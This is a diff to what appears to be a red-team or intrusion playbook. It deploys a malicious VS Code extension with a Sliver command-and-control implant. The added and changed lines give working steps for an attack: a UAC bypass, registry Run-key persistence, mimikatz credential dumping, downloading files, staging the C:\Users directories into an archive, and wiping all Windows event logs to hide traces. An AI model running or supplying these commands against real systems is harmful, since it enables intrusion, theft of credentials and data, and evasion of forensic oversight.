@@ -143,7 +143,7 @@ code --install-extension <ExtensionName>.vsix
 - [ ] Sliver stage listener is active before extension executes
 - [ ] VSIX installed on target machine
 
-## Follow On Actions
+## 10 Follow On Actions
 
 Sliver: Load extensions onto target: 
 ```bash
@@ -152,40 +152,43 @@ Armory install all --proxy http://10.10.0.100:8080
 
 ```
 
-## Priv ESC:
+## 11 Priv ESC (Optional):
 
 If UAC bypasss is required use this: 
+cmstp extenion (Cargo needs to be installed)
 
 
-## Persitance:
+## 12 Persitance:
 
 Add the VSIX file to the Admins extension folder then put VSCODE on Startup
 
 ```Powershell
-$src='C:\Users\Dewey.Houston\.vscode\extensions'; $dest='C:\Users\Administrator\.vscode\extensions'; if(!(Test-Path $dest)){New-Item $dest -ItemType Directory -Force}; Copy-Item "$src\*" $dest -Recurse -Force
-#Change Dewey Houston
+# $src='C:\Users\Dewey.Houston\.vscode\extensions'; $dest='C:\Users\Administrator\.vscode\extensions'; if(!(Test-Path $dest)){New-Item $dest -ItemType Directory -Force}; Copy-Item "$src\*" $dest -Recurse -Force
+#Change Dewey Houston / If ran as admin just run below code
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "VSCode" -Value '"C:\Program Files\Microsoft VS Code\Code.exe"'
 #Check if VSCode is on system profile
 ```
 
-## Follow on Actions
+## 13 Follow on Actions
 remove VSIX File
 ```Powershell
-remove-item C:\<Path to 
-
+remove-item "C:\<Path to vsix File"
+```
 enumerate shares with sliver and run mimikatz in sliver:
 ```bash
-sa-netuse-list
-mimikatz privilege::debug
-mimikatz sekurlsa::logonpasswords
+sliver > sa-netuse-list
+sliver > mimikatz privilege::debug
+sliver >mimikatz sekurlsa::logonpasswords
+# after staging download files with:
+sliver > download <File_Path>
 ```
 
 copy users home directory to a zip file and 
 ```Powershell
-Compress-Archive -Path "C:\Users" -DestinationPath "\\NetShare\Used
+Compress-Archive -Path "C:\Users" -DestinationPath "C:\Windows\Temp\"
 ```
 Clear Event View Logs
 
 ```Powershell
-for /f in %x in ('wevtutil el') do wevtutil cl "%x"
+wevtutil el | ForEach-Object { wevtutil cl $_ }
 ```
